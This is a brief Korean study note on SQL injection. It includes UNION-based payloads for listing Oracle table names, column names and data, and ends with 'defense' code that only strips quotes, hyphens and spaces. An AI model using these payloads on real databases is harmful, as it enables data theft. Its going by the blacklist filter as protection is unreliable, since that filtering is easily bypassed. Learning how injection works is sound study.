# SQL Injection

* 고객의 입력값을 조작하여 Server의 DB를 공격할 수 있는 공격방식

* 주로 사용자가 입력한 데이터를 제대로 필터링,이스케이핑하지 못할 경우 발생

* 해킹 시도 비중에서 가장 큰 비중을 차지하고있다.

<img src = https://user-images.githubusercontent.com/74294325/103365437-6071fc00-4b03-11eb-92a4-5cc92195d963.PNG>

* [참조 OWASP (Open Web Application Security Project)](https://wiki.owasp.org/images/b/bd/OWASP_Top_10-2017-ko.pdf)


## 간단한 Injection 예제
```
SELECT column명,?,?,?,?
FROM 테이블명
WHERE column명 `값%`;

//사용자가 입력하는 값은 query문에서 값으로 들어간다.
//query문 이후 내용이 있을 수도 있으니 --로 주석 처리

//테이블명 얻기
// `UNION SELECT TNAME,사용자가 입력한 column의 수와 맞도록 '0' 입력 --;
`UNION SELECT tname,'0','0',,,, FROM TAB;

//column명 얻기
SELECT * FROM USER_TAB_COLS --;
'UNION SELECT COLUMN_NAME,'0','0',,,, FROM USER_TAB_COL WHERE TABLE_NAME='테이블명';

//정보얻기 (UNION시 얻고자 하는 column의 데이터형과 다를경우 ||를 활용해서 데이터형을 맞춰준다.)
`UNION SELECT 얻고자 하는 column명,'0','0',,,,FROM EMP --;
```

* sql injection 방어 코드: ' , --의 특수문자를 제거한다.. 공백을 제거한다., query에 관련된 문장을 제거한다.
```
if(사용자입력값.contains("'") || 사용자입력값.contains("-") || 사용자입력값.contains(" ")) {
	사용자입력값=사용자입력값.replaceAll("'", "").replaceAll("-", "").replaceAll(" ", "");
	}
```